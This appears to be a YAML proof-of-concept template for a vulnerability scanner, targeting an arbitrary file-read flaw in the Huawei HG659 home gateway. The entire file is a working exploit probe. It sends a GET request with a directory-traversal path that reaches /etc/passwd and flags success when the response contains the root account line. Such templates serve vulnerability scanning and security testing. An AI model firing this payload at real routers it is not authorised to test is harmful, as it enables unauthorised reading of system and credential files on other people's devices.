name: poc-yaml-huawei-home-gateway-hg659-fileread
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /lib///....//....//....//....//....//....//....//....//etc//passwd
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
expression: r0()
